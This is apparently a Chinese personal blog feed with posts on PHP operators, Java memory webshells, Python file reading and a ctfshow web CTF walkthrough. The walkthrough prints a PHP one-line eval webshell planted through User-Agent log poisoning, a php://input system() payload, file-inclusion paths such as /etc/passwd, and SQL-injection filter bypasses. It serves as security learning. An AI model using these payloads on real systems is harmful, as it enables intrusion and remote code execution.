**描述**                                                     |</span><br><span class="line">| :---------- | :--------- | :----------------------------------------------------------- |</span><br><span class="line">| **x + y**   | **集合**   | **x 和 y 的集合**                                            |</span><br><span class="line">| **x == y**  | **相等**   | **如果 x 和 y 具有相同的键/值对，则返回 true**               |</span><br><span class="line">| **x === y** | **恒等**   | **如果 x 和 y 具有相同的键/值对，且顺序相同类型相同，则返回 true** |</span><br><span class="line">| **x != y**  | **不相等** | **如果 x 不等于 y，则返回 true**                             |</span><br><span class="line">| **x &lt;&gt; y**  | **不相等** | **如果 x 不等于 y，则返回 true**                             |</span><br><span class="line">| **x !== y** | **不恒等** | **如果 x 不等于 y，则返回 true**                             |</span><br><span class="line"></span><br><span class="line">#### **三元运算符**</span><br><span class="line"></span><br><span class="line">**另一个条件运算符是&quot;?:&quot;（或三元）运算符 。**</span><br><span class="line"></span><br><span class="line">##### **语法格式**</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>(expr1) ? (expr2) : (expr3)<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**对 expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3。**</span><br><span class="line"></span><br><span class="line">**自 PHP 5.3 起，可以省略三元运算符中间那部分。表达式 expr1 ?: expr3 在 expr1 求值为 TRUE 时返回 expr1，否则返回 expr3。**</span><br><span class="line"></span><br><span class="line">#### **组合比较符(PHP7+)**</span><br><span class="line"></span><br><span class="line">**PHP7+ 支持组合比较符（combined comparison operator）也称之为太空船操作符，符号为 &lt;=&gt;。组合比较运算符可以轻松实现两个变量的比较，当然不仅限于数值类数据的比较。**</span><br><span class="line"></span><br><span class="line">**语法格式如下：**</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>$c = $a &lt;=&gt; $b;<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**解析如下：**</span><br><span class="line"></span><br><span class="line">- **如果 $a &gt; $b, 则 $c 的值为 1。**</span><br><span class="line">- **如果 $a == $b, 则 $c 的值为 0。**</span><br><span class="line">- **如果 $a &lt; $b, 则 $c 的值为 -1。**</span><br><span class="line"></span><br><span class="line">#### **运算符优先级**</span><br><span class="line"></span><br><span class="line">**下表按照优先级从高到低列出了运算符。同一行中的运算符具有相同优先级，此时它们的结合方向决定求值顺序。**</span><br><span class="line"></span><br><span class="line">**说明：左 ＝ 从左到右，右 ＝ 从右到左。**</span><br><span class="line"></span><br><span class="line">| **结合方向** | **运算符**                                                   | **附加信息**                 |</span><br><span class="line">| :----------- | :----------------------------------------------------------- | :--------------------------- |</span><br><span class="line">| **无**       | **clone new**                                                | **clone 和 new**             |</span><br><span class="line">| **左**       | **[**                                                        | **array()**                  |</span><br><span class="line">| **右**       | **++ -- ~ (int) (float) (string) (array) (object) (bool) @** | **类型和递增／递减**         |</span><br><span class="line">| **无**       | **instanceof**                                               | **类型**                     |</span><br><span class="line">| **右**       | **!**                                                        | **逻辑运算符**               |</span><br><span class="line">| **左**       | *** / %**                                                    | **算术运算符**               |</span><br><span class="line">| **左**       | **+ – .**                                                    | **算术运算符和字符串运算符** |</span><br><span class="line">| **左**       | **&lt;&lt; &gt;&gt;**                                                    | **位运算符**                 |</span><br><span class="line">| **无**       | **== != === !== &lt;&gt;**                                         | **比较运算符**               |</span><br><span class="line">| **左**       | **&amp;**                                                        | **位运算符和引用**           |</span><br><span class="line">| **左**       | **^**                                                        | **位运算符**                 |</span><br><span class="line">| **左**       | **\|**                                                       | **位运算符**                 |</span><br><span class="line">| **左**       | **&amp;&amp;**                                                       | **逻辑运算符**               |</span><br><span class="line">| **左**       | **\|\|**                                                     | **逻辑运算符**               |</span><br><span class="line">| **左**       | **? :**                                                      | **三元运算符**               |</span><br><span class="line">| **右**       | **= += -= *= /= .= %= &amp;= \|= ^= &lt;&lt;= &gt;&gt;= =&gt;**                 | **赋值运算符**               |</span><br><span class="line">| **左**       | **and**                                                      | **逻辑运算符**               |</span><br><span class="line">| **左**       | **xor**                                                      | **逻辑运算符**               |</span><br><span class="line">| **左**       | **or**                                                       | **逻辑运算符**               |</span><br><span class="line">| **左**       | **,**                                                        | **多处用到**                 |</span><br><span class="line"></span><br><span class="line">## IF-ELSE</span><br><span class="line"></span><br><span class="line">if 语句：在条件成立时执行代码</span><br><span class="line"></span><br><span class="line">if...else语句：在条件成立时执行一块代码，条件不成立时执行另一块</span><br><span class="line"></span><br><span class="line">if...else...else语句：在若干条件之一成立时执行一个代码块</span><br><span class="line"></span><br><span class="line">switch语句：在若干条件之一成立时执行一个代码块</span><br><span class="line"></span><br><span class="line">#### if语句</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>if (条件)<br>{<br>条件成立时执行的代码;<br>}<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### if-else语句</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>if (条件)<br>{<br>条件成立时执行的代码;<br>}<br>else<br>{<br>条件不成立实质性的代码;<br>}<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### if-elseif-else语句</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>if (条件)<br>{<br>    if 条件成立时执行的代码;<br>}<br>elseif (条件)<br>{<br>    elseif 条件成立时执行的代码;<br>}<br>else<br>{<br>    条件不成立时执行的代码;<br>}<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## switch语句</span><br><span class="line"></span><br><span class="line">有选择的执行若干代码块之一</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>&lt;?php<br>switch(n)<br>{<br>case label1:<br>    执行的语句<br>    break;<br>case label2:<br>    执行的语句<br>    break;<br>    default:<br>    如果 n 既不等于 label1 也不等于 label2，此处代码将执行;<br>}<br>?&gt;<br>```</p><h2 id="PHP数组"><a href="#PHP数组" class="headerlink" title="PHP数组"></a>PHP数组</h2><p>在PHP中，array()函数用来创建数组：</p><p>在PHP中，有三种类型的数组：</p><ul><li>数值数组-带有数字ID的数组</li><li>关联数组-带有指定的键的数组，每个键关联一个值</li><li>多维数组-包含一个或者多个数组 的数组</li></ul>]]></content>
      
      
      <categories>
          
          <category> 语言学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> knowledge </tag>
            
            <tag> 语言学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内存马入门知识学习</title>
      <link href="/2025/01/08/2023%E5%B9%B45%E6%9C%884%E6%97%A5-%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%88%E6%9C%AA%E5%A1%AB%E5%9D%91%EF%BC%89/"/>
      <url>/2025/01/08/2023%E5%B9%B45%E6%9C%884%E6%97%A5-%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%88%E6%9C%AA%E5%A1%AB%E5%9D%91%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>Java Servlet前置知识</p><p>Servlet/Filter/Listener Java Web三大件</p><h3 id="1-Servlet"><a href="#1-Servlet" class="headerlink" title="1.Servlet"></a>1.Servlet</h3><p>Servlet是服务期端的Java的应用程序，用于处理http请求并做出相应的响应。</p><p><img src="https://s2.loli.net/2023/05/04/c9diYKwZAu1UQVb.png" alt="7200f7125f97563204de7ea26dc35c62.png"></p><h2 id="2-Filter"><a href="#2-Filter" class="headerlink" title="2.Filter"></a>2.Filter</h2><p>介于Web和Servlet之间的过滤器，用于过滤未到达Servlet的请求或者由Servlet生成但还没有返回响应</p><p>（可见上图）</p><h2 id="3-listener"><a href="#3-listener" class="headerlink" title="3.listener"></a>3.listener</h2><p>listener是用于监听某些特定动作的监听器。当特定动作发生时，监听该动作的监听器会自动调用相应的方法，比如</p><p><img src="https://s2.loli.net/2023/05/04/TPpq5HERw7okcVd.png" alt="f6ffb2c6e921b812dd6da32a017023e8.png"></p><p>解释一下上图，但我们创建一个session时，会自动调用HttpSessionListener中的sessionCreated，而当session被销毁的时候也同时会调用 sessionDestroyed() 方法</p><h2 id="内存马的攻击面"><a href="#内存马的攻击面" class="headerlink" title="内存马的攻击面"></a>内存马的攻击面</h2><p>webshell实际上也是一种web服务，所以可以有以下几种思路</p><p>1.动态注册/字节码替换 interceptor/controller（使用框架如 spring/struts2/jfinal）</p><p>2.动态注册/字节码替换 使用责任链设计模式的中间件、框架的实现（例如 Tomcat 的 Pipeline &amp; Valve，Grizzly 的 FilterChain &amp; Filter 等等）</p><p>3.动态注册/字节码替换 servlet-api 的具体实现 servlet/filter/listener</p><p>4.动态注册/字节码替换一些定时任务的具体实现 比如 TimeTask等</p><p>所以，webshell作为一个后门，实际上我们需要他完成的工作室能够接受恶意注入并回显。</p><p>（后面设计的知识还没学，过几天做回来填坑）</p>]]></content>
      
      
      <categories>
          
          <category> 内存马 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>时隔几百年重新捡起python</title>
      <link href="/2025/01/08/2023%E5%B9%B45%E6%9C%8814%E6%97%A5-%E6%97%B6%E9%9A%94%E5%87%A0%E7%99%BE%E5%B9%B4%E9%87%8D%E6%96%B0%E6%89%93%E5%BC%80python/"/>
      <url>/2025/01/08/2023%E5%B9%B45%E6%9C%8814%E6%97%A5-%E6%97%B6%E9%9A%94%E5%87%A0%E7%99%BE%E5%B9%B4%E9%87%8D%E6%96%B0%E6%89%93%E5%BC%80python/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(r&#x27;你要打开的文件的路径&#x27;) as file_project:</span><br><span class="line">    contents = file_project.read()</span><br><span class="line">print(contents)</span><br></pre></td></tr></table></figure><p>with:python中的一个关键词，用于创建一个代码块，在不需要访问文件的时候自动关闭文件</p><p>r：是一种叫做“raw string”的表示方式，它通常用于表示字符串字面值中的反斜杠字符（\）不应该被解释为转义字符，而是作为字符串的字面值的一部分。</p><p>as file_project:于给上下文管理器创建的对象起一个别名</p><p>如果想要逐行读取，可以加成这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(r&#x27;你要打开的文件的路径&#x27;) as file_project:</span><br><span class="line">    for line in file_project:</span><br><span class="line">print(line)</span><br></pre></td></tr></table></figure><p>输出后发现好多的空白行，加个rstrip（）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(r&#x27;你要打开的文件的路径&#x27;) as file_project:</span><br><span class="line">    for line in file_project:</span><br><span class="line">print(line.rstrip())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> knowledge </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门</title>
      <link href="/2025/01/08/2023%E5%B9%B45%E6%9C%8812%E6%97%A5-web%E5%85%A5%E9%97%A8/"/>
      <url>/2025/01/08/2023%E5%B9%B45%E6%9C%8812%E6%97%A5-web%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="ctfshow第一类-信息收集"><a href="#ctfshow第一类-信息收集" class="headerlink" title="ctfshow第一类:信息收集"></a>ctfshow第一类:信息收集</h3><h5 id="web-1"><a href="#web-1" class="headerlink" title="web-1"></a>web-1</h5><p>打开以后直接查看源码就可以了</p><h5 id="web-2"><a href="#web-2" class="headerlink" title="web-2"></a>web-2</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">有几种办法</span><br><span class="line">1.ctrl  u查看源码，注释里的就是</span><br><span class="line">2.在url前面添加view-source:</span><br></pre></td></tr></table></figure><h5 id="web-3"><a href="#web-3" class="headerlink" title="web-3"></a>web-3</h5><p>bp抓包重发就行了</p><h5 id="web-4-1"><a href="#web-4-1" class="headerlink" title="web-4-1"></a>web-4-1</h5><p>第四个和B站上给的不一样，是一个文件泄露的</p><p>wp说上来可以用php伪协议进行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?url=php://input放到url后面</span><br><span class="line"></span><br><span class="line">&lt;?php system(&#x27;ls ./&#x27;);?&gt;放到最后</span><br></pre></td></tr></table></figure><p>返回error</p><p>然后bp抓包发现是nginx的，使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>查看日志文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Date: Fri, 12 May 2023 06:20:02 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: PHP/7.3.11</span><br><span class="line">Content-Length: 5003</span><br><span class="line"></span><br><span class="line">172.12.0.6 - - [12/May/2023:05:48:15 +0000] &quot;GET / HTTP/1.1&quot; 200 715 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:05:48:40 +0000] &quot;GET /robots.txt HTTP/1.1&quot; 200 715 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:05:50:31 +0000] &quot;GET /index.php HTTP/1.1&quot; 200 715 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:05:50:37 +0000] &quot;GET /index.php HTTP/1.1&quot; 200 715 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:05:52:15 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 1367 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:05:53:41 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 1554 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:05:53:51 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 1741 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:05:54:41 +0000] &quot;GET /?url=php://input HTTP/1.1&quot; 200 15 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:05:56:21 +0000] &quot;GET /?url=php://input HTTP/1.1&quot; 200 15 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:05:58:04 +0000] &quot;GET /?url=/etc/passwd HTTP/1.1&quot; 200 2107 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:05:58:28 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 2443 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:01:17 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 2630 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:15:45 +0000] &quot;POST /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 2817 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:15:47 +0000] &quot;POST /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 3032 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:15:48 +0000] &quot;POST /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 3205 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Safari/537.36&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:17:51 +0000] &quot;POST /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 3418 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:17:56 +0000] &quot;POST /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 3633 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:17:58 +0000] &quot;POST /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 3843 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:19:16 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 4086 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:20:01 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 4273 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:20:01 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 4461 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:20:02 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 4648 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:20:02 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 4829 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0&quot; /&gt;</span><br><span class="line">    &lt;title&gt;ctf.show_web4&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;h2&gt;ctf.show_web4&lt;/h2&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;h3&gt;</span><br><span class="line">    &lt;code&gt;&lt;span style=&quot;color: #000000&quot;&gt;</span><br><span class="line">&lt;span style=&quot;color: #0000BB&quot;&gt;&amp;lt;?php&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;include(&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;$_GET&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color: #DD0000&quot;&gt;&#x27;url&#x27;&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;]);&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;?&amp;gt;&lt;/span&gt;</span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;/code&gt;    &lt;/center&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后在user-agent后面加了一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure><p>一句话木马，使用蚁剑连接</p><p>密码就是cmd</p><p>在var/www/下面找到flag.txt</p><h5 id="web-4-2"><a href="#web-4-2" class="headerlink" title="web-4-2"></a>web-4-2</h5><p>机器人协议robots.txt</p><p>机器人协议，爬虫协议，本质是网站和搜索引擎爬虫的沟通方式，用来指导搜索引擎更好地抓取网站内容，</p><h5 id="web-5"><a href="#web-5" class="headerlink" title="web-5"></a>web-5</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ctf.show_web5</span><br><span class="line">where is flag?</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0&quot; /&gt;</span><br><span class="line">    &lt;title&gt;ctf.show_web5&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;h2&gt;ctf.show_web5&lt;/h2&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;h3&gt;</span><br><span class="line">    &lt;/center&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        $flag=&quot;&quot;;</span><br><span class="line">        $v1=$_GET[&#x27;v1&#x27;];</span><br><span class="line">        $v2=$_GET[&#x27;v2&#x27;];</span><br><span class="line">        if(isset($v1) &amp;&amp; isset($v2))&#123;</span><br><span class="line">            if(!ctype_alpha($v1))&#123;</span><br><span class="line">                die(&quot;v1 error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(!is_numeric($v2))&#123;</span><br><span class="line">                die(&quot;v2 error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(md5($v1)==md5($v2))&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">        </span><br><span class="line">            echo &quot;where is flag?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这道题限制第一个只能是字母第二个只能是数字</p><p>第一个和第二个的md5值要相等</p><p>可以使用md5的0E绕过，详细可以来看这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/wangyuxiang946/article/details/119845182</span><br></pre></td></tr></table></figure><h5 id="web-6-1"><a href="#web-6-1" class="headerlink" title="web-6-1"></a>web-6-1</h5><p>这是一个文件泄露的题目，可以用www.zip下载备份文件</p><h5 id="web-6-2"><a href="#web-6-2" class="headerlink" title="web-6-2"></a>web-6-2</h5><p>不懂为什么，我再打开一次这个是一个sql注入的题目</p><p>输入万能钥匙发现过滤了空格，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">一般空格被过滤有如下替换方法</span><br><span class="line">1./**/</span><br><span class="line">2.()</span><br><span class="line">3.回车(url编码中的%0a)</span><br><span class="line">4.`(tap键上面的按钮)</span><br><span class="line">5.tap</span><br><span class="line">6.两个空格</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们就选用/**/来替换空格</p><p>输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 